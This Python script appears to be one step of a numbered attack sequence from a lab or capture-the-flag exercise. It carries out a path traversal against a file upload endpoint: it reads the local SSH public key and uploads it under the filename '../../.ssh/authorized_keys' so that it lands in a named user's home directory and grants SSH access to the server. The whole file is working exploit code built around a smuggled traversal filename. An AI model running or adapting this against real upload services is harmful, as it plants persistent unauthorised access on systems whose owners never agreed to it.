import os
import time

import requests


def path_travesal():
    print("The fifth attack is a path traversal attack")
    time.sleep(2)
    print("Initiating attack and uploading your id_rsa.pub file if you give your permission...")
    time.sleep(2)
    print("This will allow you to ssh into the server")
    time.sleep(2)
    print("To allow the use of your public key, press 'y', then enter")
    print("To cancel the attack, press 'n', then enter")
    while True:
        answer = input("y/n: ")
        if answer == "y":
            break
        elif answer == "n":
            print("Attack cancelled")
            return
        else:
            print("Invalid input, try again")

    url = "https://dropbox.internal.regjeringen.uiaikt.no"

    path = os.path.expanduser('~/.ssh/id_rsa.pub')

    # Load rsa key from file
    with open(path, 'r') as file:
        rsa_key = file.read()

    # Modify file data, to change upload directory
    files = {
        'file': ('../../.ssh/authorized_keys', rsa_key),
    }

    # Send the request
    response = requests.post(url, files=files)

    print(response.status_code)
    print(response.text)

    print("Attack complete. File has been uploaded to /home/ingridnilsen/.ssh/authorized_keys")
    time.sleep(2)
    print("You can now ssh into the server at 10.13.13.253")
    time.sleep(2)
    print("For the final steps, consult the report.")

